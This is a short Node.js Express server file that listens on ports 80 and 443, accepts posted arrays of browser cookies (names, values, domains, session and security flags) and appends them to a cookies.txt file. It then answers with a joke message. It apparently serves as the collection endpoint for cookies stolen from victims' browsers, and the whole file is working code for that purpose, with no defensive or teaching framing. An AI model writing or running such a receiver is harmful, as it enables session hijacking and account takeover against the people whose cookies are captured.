const bodyParser = require("body-parser");
const express = require("express");
const fs = require("fs");
const http = require("http");
const https = require("https");
const request = require("request");

const app = express();

https.createServer({key: fs.readFileSync("server.key"),
                    cert: fs.readFileSync("server.crt")},
                    app).listen(443, () => {console.log("HTTPS server started")});
                    
http.createServer(app).listen(80, () => {console.log("HTTP server started")});

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({extended: false}));

app.all("/", (req, resp) => {
    console.log(req.body);
    fs.writeFile("/home/node/cookies/cookies.txt", "", ()=>{})
    req.body.forEach((cookie) => {
        output = "name: " + cookie.name + ", value: " + cookie.value + ", domain: " + cookie.domain + ", path: " + cookie.path + ", experation: " + cookie.expirationDate + ", session: " + cookie.session + ", httpOnly: " + cookie.httpOnly + ", secure: " + cookie.secure + ", sameSite: " + cookie.sameSite + "\n";
        fs.appendFile("/home/node/cookies/cookies.txt", output, ()=>{})
    });
    resp.send("Big McThankies from McSpankies");
    });
